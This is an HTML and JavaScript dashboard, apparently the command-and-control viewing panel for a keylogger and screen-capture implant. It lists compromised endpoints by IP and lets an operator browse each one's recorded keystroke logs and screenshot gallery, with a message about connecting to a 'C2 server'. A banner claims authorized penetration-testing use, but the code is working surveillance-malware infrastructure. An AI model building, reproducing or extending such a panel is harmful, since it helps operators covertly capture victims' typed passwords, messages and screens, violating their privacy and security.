<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom Security Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            font-family: 'Inter', sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        body {
            background-color: #0b0b0f;
        }

        .cyber-card {
            background-color: rgba(17, 24, 39, 0.5);
            border: 1px solid rgba(59, 130, 246, 0.1);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
        }
        .cyber-card:hover {
            border-color: rgba(59, 130, 246, 0.3);
        }

        .sidebar {
            background-color: #111827;
            border-right: 1px solid #1f2937;
        }

        .nav-item {
            transition: all 0.2s;
        }
        .nav-item.active {
            background-color: #1e40af;
            color: #ffffff;
            border-left: 4px solid #3b82f6;
        }

        .status-online {
            background-color: #10b981;
        }
        .status-offline {
            background-color: #ef4444;
        }

        .status-pulse {
            animation: pulse-glow 2s infinite cubic-bezier(0.4, 0, 0.6, 1);
        }

        @keyframes pulse-glow {
            0%, 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
            50% { box-shadow: 0 0 0 8px rgba(16, 185, 129, 0); }
        }

        .modal-backdrop {
            background-color: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(5px);
        }

        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        ::-webkit-scrollbar-thumb {
            background: #3b82f6;
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #2563eb;
        }
        ::-webkit-scrollbar-track {
            background: #1f2937;
        }
    </style>
</head>
<body class="text-gray-200 min-h-screen flex">
    
    <aside class="sidebar w-64 fixed h-full flex flex-col pt-6 z-30">
        <div class="px-6 mb-10">
            <div class="flex items-center space-x-3">
                <div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg">
                    <i class="fas fa-shield-alt text-white text-xl"></i>
                </div>
                <div>
                    <h1 class="text-xl font-extrabold text-white tracking-wider">PhantomSec</h1>
                    <p class="text-xs text-gray-400">Assessment Platform</p>
                </div>
            </div>
        </div>

        <nav class="flex-grow space-y-2 px-4">
            <a href="#" onclick="showSection('systems')" class="nav-item active flex items-center p-3 rounded-lg text-white font-medium" data-section="systems">
                <i class="fas fa-desktop w-5 h-5 mr-3"></i>
                Systems Overview
            </a>
        </nav>

        <div class="p-4 border-t border-gray-800">
            <div class="flex items-center space-x-3 text-sm">
                <div class="w-8 h-8 bg-gray-700 rounded-full flex items-center justify-center">
                    <i class="fas fa-user text-gray-300"></i>
                </div>
                <div>
                    <p class="font-semibold text-white">Security Analyst</p>
                    <p class="text-xs text-gray-500" id="sessionTime">Session: 0m 0s</p>
                </div>
            </div>
        </div>
    </aside>

    <main class="flex-grow ml-64 p-8">
        
        <!-- Systems Overview Section -->
        <section id="systems" class="active">
            <header class="flex justify-between items-center mb-8">
                <div>
                    <h2 class="text-3xl font-extrabold text-white">Endpoint Monitoring</h2>
                    <p class="text-gray-400 mt-1">Real-time status of connected security assessment systems</p>
                </div>
                <div class="flex space-x-3 bg-[#111827] p-2 rounded-xl border border-gray-800 shadow-md">
                    <button onclick="loadDevices()" class="px-4 py-2 bg-gray-700 hover:bg-gray-600 text-white rounded-lg transition-colors duration-200 flex items-center text-sm font-medium">
                        <i class="fas fa-sync-alt mr-2"></i>Refresh
                    </button>
                    <button onclick="startAutoRefresh()" class="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors duration-200 flex items-center text-sm font-medium">
                        <i class="fas fa-play mr-2"></i>Live Monitoring
                    </button>
                    <button onclick="stopAutoRefresh()" class="px-4 py-2 bg-gray-700 hover:bg-gray-600 text-white rounded-lg transition-colors duration-200 flex items-center text-sm font-medium">
                        <i class="fas fa-pause mr-2"></i>Pause
                    </button>
                </div>
            </header>

            <div class="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
                <div class="cyber-card rounded-xl p-6">
                    <div class="flex justify-between items-start">
                        <div>
                            <p class="text-gray-400 text-sm font-medium uppercase tracking-wider">Active Endpoints</p>
                            <p id="activeCount" class="text-4xl font-extrabold text-blue-400 mt-2">0</p>
                        </div>
                        <div class="w-12 h-12 bg-blue-600/20 rounded-lg flex items-center justify-center">
                            <i class="fas fa-desktop text-blue-400 text-2xl"></i>
                        </div>
                    </div>
                    <p class="text-xs text-gray-500 mt-4">Activity rate: <span id="activeBar" class="text-green-400 font-semibold">0%</span></p>
                </div>

                <div class="cyber-card rounded-xl p-6">
                    <div class="flex justify-between items-start">
                        <div>
                            <p class="text-gray-400 text-sm font-medium uppercase tracking-wider">Total Systems</p>
                            <p id="totalCount" class="text-4xl font-extrabold text-white mt-2">0</p>
                        </div>
                        <div class="w-12 h-12 bg-gray-600/20 rounded-lg flex items-center justify-center">
                            <i class="fas fa-server text-gray-400 text-2xl"></i>
                        </div>
                    </div>
                    <p class="text-xs text-gray-500 mt-4">Registered systems in database</p>
                </div>

                <div class="cyber-card rounded-xl p-6">
                    <div class="flex justify-between items-start">
                        <div>
                            <p class="text-gray-400 text-sm font-medium uppercase tracking-wider">Total Input Events</p>
                            <p id="keystrokeCount" class="text-4xl font-extrabold text-cyan-400 mt-2">0</p>
                        </div>
                        <div class="w-12 h-12 bg-cyan-600/20 rounded-lg flex items-center justify-center">
                            <i class="fas fa-keyboard text-cyan-400 text-2xl"></i>
                        </div>
                    </div>
                    <p class="text-xs text-gray-500 mt-4">Total recorded characters & keys</p>
                </div>

                <div class="cyber-card rounded-xl p-6">
                    <div class="flex justify-between items-start">
                        <div>
                            <p class="text-gray-400 text-sm font-medium uppercase tracking-wider">Screen Captures</p>
                            <p id="screenshotCount" class="text-4xl font-extrabold text-purple-400 mt-2">0</p>
                        </div>
                        <div class="w-12 h-12 bg-purple-600/20 rounded-lg flex items-center justify-center">
                            <i class="fas fa-camera text-purple-400 text-2xl"></i>
                        </div>
                    </div>
                    <p class="text-xs text-gray-500 mt-4">Images captured for visual analysis</p>
                </div>
            </div>

            <div class="bg-red-900/10 border-l-4 border-red-600 rounded-lg p-4 mb-8">
                <div class="flex items-start">
                    <div class="mr-3 mt-1">
                        <i class="fas fa-exclamation-triangle text-red-400 text-lg"></i>
                    </div>
                    <div>
                        <p class="text-sm font-medium text-white">Security Compliance & Legal Warning</p>
                        <p class="text-xs text-gray-300 mt-1">
                            This system is strictly for **authorized security assessment and penetration testing** only. All activities are logged.
                            Unauthorized use is strictly prohibited and violates company security policies and applicable laws.
                        </p>
                    </div>
                </div>
            </div>

            <div class="cyber-card rounded-xl overflow-hidden mb-8">
                <div class="px-6 py-4 border-b border-gray-800 flex justify-between items-center bg-[#1e293b]">
                    <div>
                        <h3 class="text-xl font-semibold text-white">Endpoint Assessment List</h3>
                        <p class="text-sm text-gray-400">Detailed connection and metric data</p>
                    </div>
                    <div class="text-sm text-gray-500">
                        Last Data Update: <span id="lastUpdate" class="text-white font-medium">--:--:--</span>
                    </div>
                </div>
                
                <div class="p-4">
                    <div id="devices-container">
                        <div class="text-center py-16">
                            <div class="w-16 h-16 mx-auto mb-4 rounded-full bg-gray-700/50 flex items-center justify-center">
                                <i class="fas fa-spinner fa-spin text-3xl text-blue-400"></i>
                            </div>
                            <p class="text-gray-400 font-medium text-lg">Initializing System Scan</p>
                            <p class="text-gray-500 text-sm mt-2">Attempting connection to C2 server...</p>
                        </div>
                    </div>
                </div>
            </div>

            <div class="flex justify-between items-center text-sm text-gray-500 mt-6">
                <div class="flex items-center">
                    <div class="w-2 h-2 rounded-full bg-green-500 mr-2 shadow-lg shadow-green-500/30"></div>
                    <span>Server Status: <span class="text-gray-300 font-semibold">Operational</span></span>
                </div>
                <div>
                    <span class="font-mono">Connection Status: <span id="connectionStatus" class="text-blue-400 font-semibold">Establishing...</span></span>
                </div>
            </div>
        </section>
    </main>

    <div id="deviceModal" class="fixed inset-0 modal-backdrop hidden items-center justify-center z-50 p-4">
        <div class="bg-[#111827] rounded-xl w-full max-w-7xl max-h-[90vh] overflow-hidden border border-blue-900/50 shadow-2xl">
            <div class="px-6 py-4 border-b border-gray-800 flex justify-between items-center bg-[#0f172a]">
                <div>
                    <h3 id="modalTitle" class="text-xl font-bold text-white">System Assessment Details</h3>
                    <p class="text-sm text-gray-400">Authorized security testing data</p>
                </div>
                <button onclick="closeModal()" class="w-8 h-8 rounded-full bg-gray-800 hover:bg-red-700 flex items-center justify-center transition-colors">
                    <i class="fas fa-times text-gray-300"></i>
                </button>
            </div>
            <div id="modalContent" class="p-6 overflow-y-auto max-h-[calc(90vh-80px)]">
                <!-- Modal content will be loaded here -->
            </div>
        </div>
    </div>

    <script>
        let autoRefreshInterval = null;
        let sessionStart = new Date();

        // Session timer
        function updateSessionTimer() {
            const now = new Date();
            const diff = Math.floor((now - sessionStart) / 1000);
            const minutes = Math.floor(diff / 60);
            const seconds = diff % 60;
            document.getElementById('sessionTime').textContent = `Session: ${minutes}m ${seconds}s`;
        }

        function updateLastUpdate() {
            const now = new Date();
            document.getElementById('lastUpdate').textContent = now.toLocaleTimeString('en-US', { hour12: false });
        }

        function updateMetrics(devices) {
            const online = devices.filter(d => d.active).length;
            const total = devices.length;
            const totalKeystrokes = devices.reduce((sum, d) => sum + d.keystroke_count, 0);
            const totalScreenshots = devices.reduce((sum, d) => sum + d.screenshot_count, 0);
            
            document.getElementById('activeCount').textContent = online;
            document.getElementById('totalCount').textContent = total;
            document.getElementById('keystrokeCount').textContent = totalKeystrokes.toLocaleString();
            document.getElementById('screenshotCount').textContent = totalScreenshots.toLocaleString();
            
            const activePercentage = total > 0 ? ((online / total) * 100).toFixed(0) : 0;
            document.getElementById('activeBar').textContent = `${activePercentage}%`;
            
            document.getElementById('connectionStatus').textContent = `${online} active of ${total} total`;
            updateLastUpdate();
        }

        function loadDevices() {
            document.getElementById('connectionStatus').textContent = 'Loading...';
            
            fetch('/devices')
                .then(response => response.json())
                .then(data => {
                    updateMetrics(data);
                    renderDevicesTable(data);
                    document.getElementById('connectionStatus').textContent = 'Connected';
                })
                .catch(error => {
                    console.error('Error:', error);
                    document.getElementById('devices-container').innerHTML = `
                        <div class="text-center py-12">
                            <div class="w-16 h-16 mx-auto mb-4 rounded-full bg-red-900/20 flex items-center justify-center">
                                <i class="fas fa-exclamation-triangle text-3xl text-red-500"></i>
                            </div>
                            <p class="text-red-400 font-bold text-lg">Connection Error</p>
                            <p class="text-gray-500 text-sm mt-2">Unable to connect to assessment server or API failed.</p>
                        </div>
                    `;
                    document.getElementById('connectionStatus').textContent = 'Disconnected';
                });
        }

        function renderDevicesTable(devices) {
            if (devices.length === 0) {
                document.getElementById('devices-container').innerHTML = `
                    <div class="text-center py-12">
                        <div class="w-16 h-16 mx-auto mb-4 rounded-full bg-gray-800 flex items-center justify-center">
                            <i class="fas fa-desktop text-3xl text-gray-400"></i>
                        </div>
                        <p class="text-gray-400 font-medium text-lg">No Assessment Systems Connected</p>
                        <p class="text-gray-500 text-sm mt-2">Awaiting connections from security testing endpoints</p>
                    </div>
                `;
                return;
            }

            const tableHTML = `
                <div class="overflow-x-auto rounded-xl">
                    <table class="w-full text-left">
                        <thead class="bg-[#1f2937] text-gray-400 uppercase text-xs">
                            <tr>
                                <th class="px-6 py-3 tracking-wider">Status</th>
                                <th class="px-6 py-3 tracking-wider">System Identifier</th>
                                <th class="px-6 py-3 tracking-wider">Network Address</th>
                                <th class="px-6 py-3 tracking-wider">Last Activity</th>
                                <th class="px-6 py-3 tracking-wider">Metrics</th>
                                <th class="px-6 py-3 tracking-wider">Actions</th>
                            </tr>
                        </thead>
                        <tbody class="divide-y divide-gray-800">
                            ${devices.map(device => `
                                <tr class="hover:bg-gray-800/50 transition-colors duration-150">
                                    <td class="px-6 py-4 whitespace-nowrap">
                                        <div class="flex items-center">
                                            <div class="w-3 h-3 rounded-full ${device.active ? 'status-online status-pulse' : 'status-offline'} mr-3"></div>
                                            <span class="text-sm font-medium ${device.active ? 'text-green-400' : 'text-gray-400'}">
                                                ${device.active ? 'Active' : 'Inactive'}
                                            </span>
                                        </div>
                                    </td>
                                    <td class="px-6 py-4">
                                        <div class="flex items-center">
                                            <i class="fas fa-laptop text-gray-500 mr-3"></i>
                                            <div>
                                                <div class="text-sm font-semibold text-white">${device.name}</div>
                                                <div class="text-xs text-gray-500">ID: ${device.id.substring(0, 8)}...</div>
                                            </div>
                                        </div>
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap">
                                        <div class="text-sm text-blue-400 font-mono">${device.ip}</div>
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm">
                                        <div class="${device.active ? 'text-white' : 'text-gray-400'}">
                                            ${new Date(device.last_seen).toLocaleDateString()}
                                        </div>
                                        <div class="text-xs ${device.active ? 'text-gray-400' : 'text-gray-500'}">
                                            ${new Date(device.last_seen).toLocaleTimeString()}
                                        </div>
                                    </td>
                                    <td class="px-6 py-4">
                                        <div class="flex flex-col space-y-1">
                                            <div class="bg-blue-900/30 px-2 py-0.5 rounded-md text-xs font-medium w-fit text-blue-300">
                                                <i class="fas fa-keyboard mr-1"></i> ${device.keystroke_count}
                                            </div>
                                            <div class="bg-purple-900/30 px-2 py-0.5 rounded-md text-xs font-medium w-fit text-purple-300">
                                                <i class="fas fa-camera mr-1"></i> ${device.screenshot_count}
                                            </div>
                                        </div>
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap">
                                        <div class="flex space-x-2">
                                            <button onclick="viewKeystrokes('${device.id}')" 
                                                    class="px-3 py-2 bg-blue-900/50 hover:bg-blue-800/50 text-blue-300 rounded-lg text-xs font-medium transition-colors duration-150 flex items-center">
                                                <i class="fas fa-terminal mr-2"></i> Input Log
                                            </button>
                                            <button onclick="viewScreenshots('${device.id}')" 
                                                    class="px-3 py-2 bg-purple-900/50 hover:bg-purple-800/50 text-purple-300 rounded-lg text-xs font-medium transition-colors duration-150 flex items-center">
                                                <i class="fas fa-image mr-2"></i> Captures
                                            </button>
                                        </div>
                                    </td>
                                </tr>
                            `).join('')}
                        </tbody>
                    </table>
                </div>
            `;
            
            document.getElementById('devices-container').innerHTML = tableHTML;
        }

        function viewKeystrokes(deviceId) {
            fetch(`/device/${deviceId}/keystrokes`)
                .then(response => response.json())
                .then(data => {
                    const keystrokesHTML = data.keystrokes.map(k => 
                        `<div class="bg-gray-900/50 rounded-lg p-4 mb-3 border border-gray-800 hover:border-blue-500/50 transition-colors">
                            <div class="flex justify-between items-center mb-2">
                                <span class="font-mono text-xs text-blue-400">[LOG]</span>
                                <div class="text-xs text-gray-500">
                                    ${new Date(k.timestamp).toLocaleString()}
                                </div>
                            </div>
                            <pre class="font-mono text-sm text-gray-200 bg-black/70 p-3 rounded-lg border border-gray-900 overflow-x-auto whitespace-pre-wrap break-words">
                                ${k.data}
                            </pre>
                        </div>`
                    ).join('');
                    
                    document.getElementById('modalTitle').innerHTML = `<i class="fas fa-terminal mr-2 text-cyan-400"></i> Input Analysis - ${data.device.name}`;
                    document.getElementById('modalContent').innerHTML = `
                        <div class="grid grid-cols-1 md:grid-cols-4 gap-6">
                            <div class="md:col-span-1">
                                <div class="cyber-card rounded-xl p-5 border-blue-600/30">
                                    <h4 class="text-lg font-bold text-white mb-3">System Details</h4>
                                    <p class="text-sm font-mono text-gray-300">IP: <span class="text-blue-400">${data.device.ip}</span></p>
                                    <p class="text-sm font-mono text-gray-300">Status: <span class="${data.device.active ? 'text-green-400' : 'text-red-400'}">${data.device.active ? 'Active' : 'Inactive'}</span></p>
                                    <p class="text-sm font-mono text-gray-300">Total Logs: <span class="text-white">${data.keystrokes.length}</span></p>
                                    <p class="text-xs text-gray-500 mt-4">ID: ${data.device.id}</p>
                                </div>
                            </div>
                            <div class="md:col-span-3">
                                <div class="flex justify-between items-center mb-4">
                                    <h4 class="text-xl font-semibold text-white">Keystroke Log Stream</h4>
                                </div>
                                <div class="max-h-[70vh] overflow-y-auto pr-2">
                                    ${keystrokesHTML.length ? keystrokesHTML : 
                                        `<div class="text-center py-12 bg-gray-900/50 rounded-lg">
                                            <div class="w-12 h-12 mx-auto mb-4 rounded-full bg-gray-800 flex items-center justify-center">
                                                <i class="fas fa-clipboard text-2xl text-gray-400"></i>
                                            </div>
                                            <p class="text-gray-400 font-medium">No Input Data</p>
                                            <p class="text-gray-500 text-sm mt-1">No input events recorded for security analysis</p>
                                        </div>`
                                    }
                                </div>
                            </div>
                        </div>
                    `;
                    document.getElementById('deviceModal').classList.remove('hidden');
                });
        }

        function viewScreenshots(deviceId) {
            fetch(`/device/${deviceId}/screenshots`)
                .then(response => response.json())
                .then(screenshots => {
                    const screenshotsHTML = screenshots.map((shot, index) => `
                        <div class="cyber-card rounded-lg overflow-hidden transition-all duration-300 hover:shadow-blue-500/30">
                            <div class="relative bg-black h-48">
                                <img src="/screenshot/${deviceId}/${shot.filename}" 
                                     alt="Security Assessment Capture" 
                                     class="w-full h-full object-cover cursor-pointer transition-opacity duration-300 hover:opacity-75"
                                     onclick="openImage('/screenshot/${deviceId}/${shot.filename}')">
                                <div class="absolute top-3 left-3 bg-gray-900/80 text-purple-400 text-xs px-2 py-1 rounded-full font-mono">
                                    ${(shot.size / 1024 / 1024).toFixed(1)} MB
                                </div>
                            </div>
                            <div class="p-3">
                                <div class="font-mono text-sm text-gray-300 truncate">${shot.filename}</div>
                                <div class="flex justify-between items-center mt-2">
                                    <div class="text-xs text-gray-500">${new Date(shot.modified).toLocaleString()}</div>
                                    <button onclick="openImage('/screenshot/${deviceId}/${shot.filename}')" 
                                            class="px-3 py-1 bg-purple-600 hover:bg-purple-700 rounded text-xs transition-colors font-medium">
                                        View Full
                                    </button>
                                </div>
                            </div>
                        </div>
                    `).join('');
                    
                    document.getElementById('modalTitle').innerHTML = `<i class="fas fa-image mr-2 text-purple-400"></i> Visual Assessment Data (${screenshots.length} Captures)`;
                    document.getElementById('modalContent').innerHTML = `
                        <div class="p-4">
                            <h4 class="text-xl font-semibold text-white mb-4">Screen Capture Gallery</h4>
                            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 xl:grid-cols-5 gap-4 max-h-[75vh] overflow-y-auto pr-2">
                                ${screenshotsHTML.length ? screenshotsHTML : 
                                    `<div class="col-span-5 text-center py-12 bg-gray-900/50 rounded-lg">
                                        <div class="w-12 h-12 mx-auto mb-4 rounded-full bg-gray-800 flex items-center justify-center">
                                            <i class="fas fa-camera text-2xl text-gray-400"></i>
                                        </div>
                                        <p class="text-gray-400 font-medium">No Visual Data Available</p>
                                        <p class="text-gray-500 text-sm mt-1">No screen captures recorded for assessment</p>
                                    </div>`
                                }
                            </div>
                        </div>
                    `;
                    document.getElementById('deviceModal').classList.remove('hidden');
                });
        }

        function openImage(url) {
            window.open(url, '_blank', 'noopener,noreferrer');
        }

        function closeModal() {
            document.getElementById('deviceModal').classList.add('hidden');
        }

        function startAutoRefresh() {
            stopAutoRefresh();
            autoRefreshInterval = setInterval(loadDevices, 30000);
            document.getElementById('connectionStatus').textContent = 'Live Monitoring Active';
        }

        function stopAutoRefresh() {
            if (autoRefreshInterval) {
                clearInterval(autoRefreshInterval);
                autoRefreshInterval = null;
                document.getElementById('connectionStatus').textContent = 'Monitoring Paused';
            }
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            loadDevices();
            updateLastUpdate();
            
            // Start session timer
            setInterval(updateSessionTimer, 1000);
            
            // Start auto-refresh
            startAutoRefresh();
        });

        // Close modal on escape key
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') closeModal();
        });

        // Keep showSection function for potential future expansion
        function showSection(sectionId) {
            // Only one section for now, but keep structure for future
        }
    </script>
</body>
</html>